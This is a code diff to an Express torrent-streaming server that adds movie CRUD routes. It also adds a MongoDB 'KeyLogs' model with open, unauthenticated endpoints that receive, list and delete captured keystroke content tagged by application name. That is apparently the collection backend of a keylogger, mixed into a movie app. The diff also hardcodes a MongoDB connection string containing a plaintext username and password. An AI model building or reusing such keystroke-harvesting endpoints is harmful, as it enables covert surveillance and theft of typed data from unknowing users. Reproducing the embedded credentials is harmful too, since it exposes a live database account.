@@ -144,21 +144,204 @@ function handleStreaming(torrent, req, res) {
   stream.pipe(res);
 }
 
-function determineMimeType(filename) {
-  const ext = filename.split('.').pop();
-  const mimeTypes = {
-    mp4: 'video/mp4',
-    m4v: 'video/x-m4v',
-    mov: 'video/quicktime',
-    mkv: 'video/x-matroska',
-    avi: 'video/x-msvideo',
-    wmv: 'video/x-ms-wmv',
-    flv: 'video/x-flv',
-    webm: 'video/webm',
+// Express routes
+app.get("/auth-now", (req, res) => {
+  res.send("Successfully reauthenticated!");
+});
+
+app.get("/", (req, res) => {
+  console.log("Test");
+  res.send("Successfully authenticated!");
+});
+
+// MongoDB connection
+const mongoURI = "mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+
+mongoose
+  .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
+  .then(() => console.log("MongoDB connected..."))
+  .catch((err) => console.log(err));
+
+// Define Schema
+const MovieSchema = new mongoose.Schema({
+  id: { type: String, required: true },
+  poster: { type: String, required: false },
+  plot: { type: String, required: false },
+  year: { type: String, required: false },
+  tmdb_id: { type: String, required: true },
+  media_url: { type: String, required: true },
+});
+
+const Movies = mongoose.model("Movies", MovieSchema);
+
+const KeyLogSchema = new mongoose.Schema({
+  content: { type: String, required: true },
+  appName: { type: String },
+  isLocal: { type: Boolean, default: false },
+  timeStamp: { type: Date, default: Date.now },
+});
+
+const KeyLogs = mongoose.model("KeyLogs", KeyLogSchema);
+
+// Routes for CRUD operations
+app.post("/movie", async (req, res) => {
+  try {
+    console.log("req body -----> : ", req.body);
+    const newMovie = new Movies(req.body);
+    const savedMovie = await newMovie.save();
+    res.status(201).json(savedMovie);
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ message: err.message });
+  }
+});
+
+app.get("/movies", async (req, res) => {
+  try {
+    const movies = await Movies.find();
+    res.status(200).json(movies);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+app.get("/movies/:id", async (req, res) => {
+  try {
+    const movie = await Movies.findById(req.params.id);
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json(movie);
+  } catch (err) {
+    console.error(err);
+    res.status(404).json({ message: err.message });
+  }
+});
+
+app.put("/movies/:id", async (req, res) => {
+  try {
+    const movie = await Movies.findByIdAndUpdate(req.params.id, req.body, {
+      new: true,
+      runValidators: true,
+    });
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json(movie);
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ message: err.message });
+  }
+});
+
+app.delete("/movies/all", async (req, res) => {
+  try {
+    const movie = await Movies.deleteMany({});
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json({ message: "Movie deleted" });
+  } catch (err) {
+    console.error(err);
+    res.status(404).json({ message: err.message });
+  }
+});
+
+app.delete("/movies/:id", async (req, res) => {
+  try {
+    const movie = await Movies.findByIdAndDelete(req.params.id);
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json({ message: "Movie deleted" });
+  } catch (err) {
+    console.error(err);
+    res.status(404).json({ message: err.message });
+  }
+});
+
+app.post("/keylog", async (req, res) => {
+  try {
+    const newLogEntry = new KeyLogs(req.body);
+    const savedLog = await newLogEntry.save();
+    res.status(201).json(savedLog);
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ message: err.message });
+  }
+});
+
+app.post("/local-keylog", async (req, res) => {
+  try {
+    const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
+    const savedLog = await newLogEntry.save();
+    res.status(201).json(savedLog);
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ message: err.message });
+  }
+});
+
+app.get("/keylogs", async (req, res) => {
+  try {
+    const logs = await KeyLogs.find({ isLocal: false });
+    res.status(200).json(logs);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+app.get("/local-keylogs", async (req, res) => {
+  try {
+    const logs = await KeyLogs.find({ isLocal: true });
+    res.status(200).json(logs);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+app.delete("/keylogs", async (req, res) => {
+  try {
+    const deletedLogs = await KeyLogs.deleteMany({});
+    if (deletedLogs.deletedCount === 0) {
+      throw new Error("No logs to delete");
+    }
+    res.status(200).json({ message: "All logs deleted" });
+  } catch (err) {
+    console.error(err);
+    res.status(404).json({ message: err.message });
+  }
+});
+
+// Function to calculate approximate byte range for the desired duration
+function calculateByteRangeForDuration(file, durationInSeconds) {
+  const estimatedTotalBitrate = file.length / durationInSeconds; // bytes per second
+  return {
+    start: 0,
+    end: Math.min(file.length - 1, Math.floor(estimatedTotalBitrate * durationInSeconds)),
   };
-  return mimeTypes[ext] || 'application/octet-stream';
 }
 
+function determineMimeType(filename) {
+  const extension = filename.split('.').pop();
+  switch (extension) {
+    case 'mp4':
+      return 'video/mp4';
+    case 'm4v':
+      return 'video/x-m4v'; // or 'video/mp4'
+    case 'mov':
+      return 'video/quicktime';
+    case 'mkv':
+      return 'video/x-matroska';
+    case 'avi':
+      return 'video/x-msvideo';
+    case 'wmv':
+      return 'video/x-ms-wmv';
+    case 'flv':
+      return 'video/x-flv';
+    case 'webm':
+      return 'video/webm';
+    default:
+      return 'application/octet-stream'; // Default MIME type if the extension is not recognized
+  }
+}
+
+// Start server
 app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+  console.log("Server started at port: " + PORT);
 });
